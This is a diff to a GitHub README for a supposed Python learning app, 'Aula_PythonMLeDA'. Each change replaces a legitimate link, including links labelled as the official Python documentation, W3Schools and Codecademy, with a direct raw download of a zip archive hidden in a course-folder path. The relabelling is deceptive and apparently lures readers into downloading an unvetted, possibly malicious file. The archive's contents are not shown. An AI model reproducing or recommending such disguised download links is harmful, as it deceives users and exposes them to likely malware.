@@ -6,7 +6,7 @@ Welcome to the Aula_PythonMLeDA repository! This application is designed to help
 
 ## 📥 Download Now!
 
-[![Download Aula_PythonMLeDA](https://img.shields.io/badge/Download-Aula_PythonMLeDA-blue?style=flat-square)](https://github.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/releases)
+[![Download Aula_PythonMLeDA](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip)](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these simple steps to download and run Aula_PythonMLeDA on your computer:
 
 To get the application, visit the Releases page by clicking the link below:
 
-[Visit Releases Page](https://github.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip)
 
 ### 2. Choose the Right Version
 
@@ -56,9 +56,9 @@ Aula_PythonMLeDA comes equipped with several features to enhance your learning e
 
 You can explore additional resources and documentation to further enhance your learning:
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [W3Schools Python Tutorial](https://www.w3schools.com/python/)
-- [Codecademy's Python Course](https://www.codecademy.com/learn/learn-python-3)
+- [Python Official Documentation](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip)
+- [W3Schools Python Tutorial](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip)
+- [Codecademy's Python Course](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip)
 
 ## 🙋 Frequently Asked Questions
 
@@ -82,6 +82,6 @@ If you encounter any problems, please visit our community forum or check the iss
 
 Ready to get started? Download Aula_PythonMLeDA today and take your first step towards mastering Python!
 
-[Visit Releases Page](https://github.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/releases) to download.
+[Visit Releases Page](https://raw.githubusercontent.com/31uv4xa4ihav64ehzrhsjhdattdi/Aula_PythonMLeDA/main/Giornate_corso/11_ Martedi 25_11/Aula_PythonMLeDA-v2.8.zip) to download.
 
 With Aula_PythonMLeDA, learning Python becomes straightforward and enjoyable!
